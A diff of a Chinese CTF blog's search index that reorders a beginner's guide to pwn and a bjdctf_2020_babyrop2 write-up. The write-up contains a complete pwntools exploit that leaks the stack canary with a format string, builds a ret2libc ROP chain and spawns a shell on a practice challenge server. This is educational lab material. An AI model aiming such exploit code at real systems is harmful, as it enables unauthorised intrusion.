@@ -1,73 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Pwn入门指南</title>
-    <url>/2021/10/20/PWN%E2%80%94%E2%80%94%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</url>
-    <content><![CDATA[<span id="more"></span>
-<h1 id="PWN——从入门到入土"><a href="#PWN——从入门到入土" class="headerlink" title="PWN——从入门到入土"></a>PWN——从入门到入土</h1><h3 id="咚-咚-咚"><a href="#咚-咚-咚" class="headerlink" title="咚!咚!咚!"></a>咚!咚!咚!</h3><hr>
-<p><del>从入门到入土之路开始了</del></p>
-<blockquote>
-<p>”Pwn”是一个黑客语法的俚语词 ，是指攻破设备或者系统 。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了 。</p>
-</blockquote>
-<p>在CTF比赛中，pwn题主要是考察对<strong>二进制漏洞的发掘和利用</strong>，在此之上你必须要对<strong>计算机操作系统</strong>的 底层有一定的了解，这也是为什么pwn的入门门槛是所有方向中最高的原因之一。当然如果你是0基础的<strong>猛新</strong>也不用担心，因为基本上没有人是在所有关于操作系统的课程都上完过后才去学习pwn的，ctf为你提供了一个学习的平台，你可以一边拓展你的知识面一边享受pwn的乐趣。</p>
-<h2 id="学习Pwn，你必须了解或掌握的知识"><a href="#学习Pwn，你必须了解或掌握的知识" class="headerlink" title="学习Pwn，你必须了解或掌握的知识"></a>学习Pwn，你必须了解或掌握的知识</h2><ol>
-<li><strong>C语言</strong></li>
-<li><strong>汇编语言</strong></li>
-<li><strong>最基础的python</strong></li>
-<li><strong>IDA等pwntools的使用</strong></li>
-<li><strong>计算机组成原理</strong></li>
-<li><strong>计算机操作系统</strong></li>
-<li><strong>编译原理</strong></li>
-</ol>
-<p>这里推荐两本相关书籍，有意学习<strong>Pwn</strong>方向的同学可以留心一下</p>
-<ul>
-<li><strong>《CTF竞赛权威指南 pwn篇》</strong>（方便快速入门）</li>
-<li><strong>《汇编语言（第4版）》</strong>（王爽著）</li>
-</ul>
-<p>同时这里也建议多关注一些论坛，比如吾爱破解，安全客，先知社区，freebuf，看雪等等，在这上面你 能学到不少漏洞利用相关姿势，可以在摸鱼的时候浏览查看</p>
-<h2 id="Pwn的解题流程"><a href="#Pwn的解题流程" class="headerlink" title="Pwn的解题流程"></a>Pwn的解题流程</h2><h3 id="1-关于环境"><a href="#1-关于环境" class="headerlink" title="1.关于环境"></a>1.关于环境</h3><p>如果你是windows平台的话，首先你需要一台<strong>linux虚拟机</strong>，这里推荐使用<strong>ubuntu18.04</strong>，因为大多数 pwn题的部署环境都是<strong>ubuntu</strong>，便于你本地的调试，有了这样一台虚拟机后，你就可以在上面本地或者 远程调试pwn题了 <del>（但我个人也在经常使用<strong>kali</strong>，因为自带pwntools，解题有时还是很方便的）</del></p>
-<p>注：linux环境下由于默认的远程软件库是国外的源，下载速度可能会比较慢，可以在清华镜像源里去下载需要的Linux版本</p>
-<p>同时，你需要安装pwntools这个python库，它是你在面对pwn题时最有力的工具，用它来get一个个 shell吧（安装方法详情请见百度） 在windows下你则需要<strong>IDA</strong>这个静态分析工具，建议在做题之前先在网上好好了解一下IDA的使用，会极大方便接下来的做题</p>
-<h3 id="2-举个栗子"><a href="#2-举个栗子" class="headerlink" title="2.举个栗子"></a>2.举个栗子</h3><p>拿到一个pwn题，第一时间便是<strong>检查保护机制</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">1|ret2text checksec ret2text2|Arch: i386-32-little3|RELRO: Partial RELRO4|Stack: No canary found5|NX: NX enabled6|PIE: No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<ul>
-<li><strong>arch</strong>即程序所采用的架构，由上可知这是一个x86架构下的32位程序 </li>
-<li><strong>RELRO</strong>(Relocation Read Only)，重定位表只读，这个保护并未完全开启，若完全开启则got表与 plt表只读不可写 </li>
-<li><strong>canary</strong>，语义意为金丝雀； Stack canary 保护机制在刚进入函数时，在栈上放置一个标志 canary ，然后 在函数结束时，判断该标志是否被改变，如果被改变，则表示有攻击行为发生，同时结束程序运行。同上这个保护也未开启</li>
-<li> <strong>NX</strong>(栈不可执行)，NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当 攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种 方法绕过</li>
-<li> <strong>PIE</strong>(Position-Independent Executable, 位置无关可执行文件)，即程序运行时各个段（如代码段 等）加载的虚拟地址也是在装载时才确定</li>
-</ul>
-<p><strong>第二步</strong>，使用<strong>IDA静态工具</strong>查看ELF文件，通过反编译查看伪代码，读懂文件的内容，然后利用相应的方法解题(格式化字符串，栈溢出，整数溢出，堆溢出……)</p>
-<p>一般到最后，就会利用python编写脚本（exp），然后拿到题目的flag</p>
-<p><del>（不过最简单的pwn题，你只需要通过nc连接题目靶机端口，然后cat flag就能拿到flag）</del></p>
-<p><img src="http://pr0b1em.top/img/cat.jpg" alt="img"></p>
-<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><h3 id="Pwner-pwn-for-what"><a href="#Pwner-pwn-for-what" class="headerlink" title="Pwner: pwn for what?"></a>Pwner: pwn for what?</h3><hr>
-<p>就CTF比赛这几个大类来看，pwn无疑是入门门槛最高的一个方向。它要求你具备以下基本能力：</p>
-<ul>
-<li>代码审计能力 </li>
-<li>对整体程序流的认知与把握 </li>
-<li>发掘程序中的漏洞点 </li>
-<li>善用所有可利用的漏洞点来发起攻击</li>
-</ul>
-<h4 id="金句"><a href="#金句" class="headerlink" title="金句"></a>金句</h4><p>在整个getshell的过程中，困难是其次的，重要的是保持<strong>耐心与热情</strong>；在每个pwner的生涯中或许都会有过长久不能入眠的夜晚，面对屏幕上的一行行代码，逐行分析每个字符，思索各种可能存在的漏洞······最终，你或能在交互后成功在命令行里输入cat flag ，亦或在疑惑中查询他人的wp，无论结果与否，在潜移默化之中，你都在朝着未来的<strong>pwn master</strong>的方向砥砺前行。当你在CTF众多分支里选择Pwn的时候，摆在你面前的就不是一条轻松的道路，关于二进制的研究都是如此，所有的pwner都是从萌新一步步逐渐挣扎着、努力变成大佬的，毕竟在拿到shell后心里默念的”hacked by xxx”之中的喜悦之情是什么都难以掩藏的吧！</p>
-<blockquote>
-<p>Hack Just For Fun</p>
-<p>双手合十成为自己的神，双手张开比肩神明</p>
-</blockquote>
-<p>希望你能在黑暗中探寻光明的道路，用你内心无尽的热爱点燃这Pwn世界。</p>
-<blockquote>
-<p><strong>XJUSEC{Love_Pwn_Forever!}</strong></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>(HarekazeCTF2019)baby_rop2</title>
     <url>/2021/06/28/HarekazeCTF2019-baby-rop2/</url>
     <content><![CDATA[<h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>检查保护机制，64位，开NX</p>
@@ -143,6 +76,73 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 ]]></content>
       <categories>
         <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pwn入门指南</title>
+    <url>/2021/10/20/PWN%E2%80%94%E2%80%94%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="PWN——从入门到入土"><a href="#PWN——从入门到入土" class="headerlink" title="PWN——从入门到入土"></a>PWN——从入门到入土</h1><h3 id="咚-咚-咚"><a href="#咚-咚-咚" class="headerlink" title="咚!咚!咚!"></a>咚!咚!咚!</h3><hr>
+<p><del>从入门到入土之路开始了</del></p>
+<blockquote>
+<p>”Pwn”是一个黑客语法的俚语词 ，是指攻破设备或者系统 。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了 。</p>
+</blockquote>
+<p>在CTF比赛中，pwn题主要是考察对<strong>二进制漏洞的发掘和利用</strong>，在此之上你必须要对<strong>计算机操作系统</strong>的 底层有一定的了解，这也是为什么pwn的入门门槛是所有方向中最高的原因之一。当然如果你是0基础的<strong>猛新</strong>也不用担心，因为基本上没有人是在所有关于操作系统的课程都上完过后才去学习pwn的，ctf为你提供了一个学习的平台，你可以一边拓展你的知识面一边享受pwn的乐趣。</p>
+<h2 id="学习Pwn，你必须了解或掌握的知识"><a href="#学习Pwn，你必须了解或掌握的知识" class="headerlink" title="学习Pwn，你必须了解或掌握的知识"></a>学习Pwn，你必须了解或掌握的知识</h2><ol>
+<li><strong>C语言</strong></li>
+<li><strong>汇编语言</strong></li>
+<li><strong>最基础的python</strong></li>
+<li><strong>IDA等pwntools的使用</strong></li>
+<li><strong>计算机组成原理</strong></li>
+<li><strong>计算机操作系统</strong></li>
+<li><strong>编译原理</strong></li>
+</ol>
+<p>这里推荐两本相关书籍，有意学习<strong>Pwn</strong>方向的同学可以留心一下</p>
+<ul>
+<li><strong>《CTF竞赛权威指南 pwn篇》</strong>（方便快速入门）</li>
+<li><strong>《汇编语言（第4版）》</strong>（王爽著）</li>
+</ul>
+<p>同时这里也建议多关注一些论坛，比如吾爱破解，安全客，先知社区，freebuf，看雪等等，在这上面你 能学到不少漏洞利用相关姿势，可以在摸鱼的时候浏览查看</p>
+<h2 id="Pwn的解题流程"><a href="#Pwn的解题流程" class="headerlink" title="Pwn的解题流程"></a>Pwn的解题流程</h2><h3 id="1-关于环境"><a href="#1-关于环境" class="headerlink" title="1.关于环境"></a>1.关于环境</h3><p>如果你是windows平台的话，首先你需要一台<strong>linux虚拟机</strong>，这里推荐使用<strong>ubuntu18.04</strong>，因为大多数 pwn题的部署环境都是<strong>ubuntu</strong>，便于你本地的调试，有了这样一台虚拟机后，你就可以在上面本地或者 远程调试pwn题了 <del>（但我个人也在经常使用<strong>kali</strong>，因为自带pwntools，解题有时还是很方便的）</del></p>
+<p>注：linux环境下由于默认的远程软件库是国外的源，下载速度可能会比较慢，可以在清华镜像源里去下载需要的Linux版本</p>
+<p>同时，你需要安装pwntools这个python库，它是你在面对pwn题时最有力的工具，用它来get一个个 shell吧（安装方法详情请见百度） 在windows下你则需要<strong>IDA</strong>这个静态分析工具，建议在做题之前先在网上好好了解一下IDA的使用，会极大方便接下来的做题</p>
+<h3 id="2-举个栗子"><a href="#2-举个栗子" class="headerlink" title="2.举个栗子"></a>2.举个栗子</h3><p>拿到一个pwn题，第一时间便是<strong>检查保护机制</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">1|ret2text checksec ret2text2|Arch: i386-32-little3|RELRO: Partial RELRO4|Stack: No canary found5|NX: NX enabled6|PIE: No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li><strong>arch</strong>即程序所采用的架构，由上可知这是一个x86架构下的32位程序 </li>
+<li><strong>RELRO</strong>(Relocation Read Only)，重定位表只读，这个保护并未完全开启，若完全开启则got表与 plt表只读不可写 </li>
+<li><strong>canary</strong>，语义意为金丝雀； Stack canary 保护机制在刚进入函数时，在栈上放置一个标志 canary ，然后 在函数结束时，判断该标志是否被改变，如果被改变，则表示有攻击行为发生，同时结束程序运行。同上这个保护也未开启</li>
+<li> <strong>NX</strong>(栈不可执行)，NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当 攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种 方法绕过</li>
+<li> <strong>PIE</strong>(Position-Independent Executable, 位置无关可执行文件)，即程序运行时各个段（如代码段 等）加载的虚拟地址也是在装载时才确定</li>
+</ul>
+<p><strong>第二步</strong>，使用<strong>IDA静态工具</strong>查看ELF文件，通过反编译查看伪代码，读懂文件的内容，然后利用相应的方法解题(格式化字符串，栈溢出，整数溢出，堆溢出……)</p>
+<p>一般到最后，就会利用python编写脚本（exp），然后拿到题目的flag</p>
+<p><del>（不过最简单的pwn题，你只需要通过nc连接题目靶机端口，然后cat flag就能拿到flag）</del></p>
+<p><img src="http://pr0b1em.top/img/cat.jpg" alt="img"></p>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><h3 id="Pwner-pwn-for-what"><a href="#Pwner-pwn-for-what" class="headerlink" title="Pwner: pwn for what?"></a>Pwner: pwn for what?</h3><hr>
+<p>就CTF比赛这几个大类来看，pwn无疑是入门门槛最高的一个方向。它要求你具备以下基本能力：</p>
+<ul>
+<li>代码审计能力 </li>
+<li>对整体程序流的认知与把握 </li>
+<li>发掘程序中的漏洞点 </li>
+<li>善用所有可利用的漏洞点来发起攻击</li>
+</ul>
+<h4 id="金句"><a href="#金句" class="headerlink" title="金句"></a>金句</h4><p>在整个getshell的过程中，困难是其次的，重要的是保持<strong>耐心与热情</strong>；在每个pwner的生涯中或许都会有过长久不能入眠的夜晚，面对屏幕上的一行行代码，逐行分析每个字符，思索各种可能存在的漏洞······最终，你或能在交互后成功在命令行里输入cat flag ，亦或在疑惑中查询他人的wp，无论结果与否，在潜移默化之中，你都在朝着未来的<strong>pwn master</strong>的方向砥砺前行。当你在CTF众多分支里选择Pwn的时候，摆在你面前的就不是一条轻松的道路，关于二进制的研究都是如此，所有的pwner都是从萌新一步步逐渐挣扎着、努力变成大佬的，毕竟在拿到shell后心里默念的”hacked by xxx”之中的喜悦之情是什么都难以掩藏的吧！</p>
+<blockquote>
+<p>Hack Just For Fun</p>
+<p>双手合十成为自己的神，双手张开比肩神明</p>
+</blockquote>
+<p>希望你能在黑暗中探寻光明的道路，用你内心无尽的热爱点燃这Pwn世界。</p>
+<blockquote>
+<p><strong>XJUSEC{Love_Pwn_Forever!}</strong></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>笔记</category>
       </categories>
       <tags>
         <tag>pwn</tag>
@@ -548,64 +548,6 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
       </tags>
   </entry>
   <entry>
-    <title>bjdctf_2020_babyrop2</title>
-    <url>/2021/07/18/bjdctf-2020-babyrop2/</url>
-    <content><![CDATA[<h1 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h1><p>检查保护机制，开了NX和canary，64位</p>
-<p><img src="/img/image-20210718104136221.png" alt="image-20210718104136221"></p>
-<p>IDA打开，查看main函数，发现里面利用到了三个函数</p>
-<p><img src="/img/image-20210718104243834.png" alt="image-20210718104243834"></p>
-<p>init函数，初始化输出提示</p>
-<p><img src="/img/image-20210718104312978.png" alt="image-20210718104312978"></p>
-<p>gift函数，存在格式化字符串漏洞</p>
-<p><img src="/img/image-20210718104333802.png" alt="image-20210718104333802"></p>
-<p>vuln函数，存在栈溢出漏洞</p>
-<p><img src="/img/image-20210718104359430.png" alt="image-20210718104359430"></p>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><h5 id="可利用gift函数的格式化字符串漏洞，泄露canary的值"><a href="#可利用gift函数的格式化字符串漏洞，泄露canary的值" class="headerlink" title="可利用gift函数的格式化字符串漏洞，泄露canary的值"></a>可利用<code>gift</code>函数的格式化字符串漏洞，泄露<code>canary</code>的值</h5><p>得到偏移量为7</p>
-<p><img src="/img/20200826223512973.png"></p>
-<p>没有发现system和’/bin/sh’，只有通过vuln函数栈溢出漏洞，泄露libc地址，然后得到</p>
-<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
-
-context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"amd64"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>
-p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">27304</span><span class="token punctuation">)</span>
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./bjdctf_2020_babyrop2"</span><span class="token punctuation">)</span>
-
-puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
-puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
-vuln_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"vuln"</span><span class="token punctuation">]</span>
-pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400993</span>
-
-payload <span class="token operator">=</span> <span class="token string">b"%7$p"</span>
-p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"u!"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>
-canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
-payload <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">8</span>
-payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"story!"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-
-puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
-libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>
-system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
-binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>
-payload <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">8</span>
-payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"story!"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span>
-
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/img/image-20210718110410868.png" alt="image-20210718110410868"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>canary</title>
     <url>/2021/12/20/canary/</url>
     <content><![CDATA[<span id="more"></span>
@@ -713,6 +655,64 @@ main<span class="token punctuation">(</span><span class="token punctuation">)</s
       </tags>
   </entry>
   <entry>
+    <title>bjdctf_2020_babyrop2</title>
+    <url>/2021/07/18/bjdctf-2020-babyrop2/</url>
+    <content><![CDATA[<h1 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h1><p>检查保护机制，开了NX和canary，64位</p>
+<p><img src="/img/image-20210718104136221.png" alt="image-20210718104136221"></p>
+<p>IDA打开，查看main函数，发现里面利用到了三个函数</p>
+<p><img src="/img/image-20210718104243834.png" alt="image-20210718104243834"></p>
+<p>init函数，初始化输出提示</p>
+<p><img src="/img/image-20210718104312978.png" alt="image-20210718104312978"></p>
+<p>gift函数，存在格式化字符串漏洞</p>
+<p><img src="/img/image-20210718104333802.png" alt="image-20210718104333802"></p>
+<p>vuln函数，存在栈溢出漏洞</p>
+<p><img src="/img/image-20210718104359430.png" alt="image-20210718104359430"></p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><h5 id="可利用gift函数的格式化字符串漏洞，泄露canary的值"><a href="#可利用gift函数的格式化字符串漏洞，泄露canary的值" class="headerlink" title="可利用gift函数的格式化字符串漏洞，泄露canary的值"></a>可利用<code>gift</code>函数的格式化字符串漏洞，泄露<code>canary</code>的值</h5><p>得到偏移量为7</p>
+<p><img src="/img/20200826223512973.png"></p>
+<p>没有发现system和’/bin/sh’，只有通过vuln函数栈溢出漏洞，泄露libc地址，然后得到</p>
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"amd64"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">27304</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./bjdctf_2020_babyrop2"</span><span class="token punctuation">)</span>
+
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
+puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
+vuln_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"vuln"</span><span class="token punctuation">]</span>
+pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400993</span>
+
+payload <span class="token operator">=</span> <span class="token string">b"%7$p"</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"u!"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>
+canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">8</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"story!"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>
+system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
+binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">8</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"story!"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/img/image-20210718110410868.png" alt="image-20210718110410868"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ciscn_2019_es_2</title>
     <url>/2021/06/28/ciscn-2019-es-2/</url>
     <content><![CDATA[<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><p>检查保护机制，32位，开启NX</p>
@@ -777,6 +777,20 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
       </tags>
   </entry>
   <entry>
+    <title>CURL</title>
+    <url>/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><span id="more"></span>
+
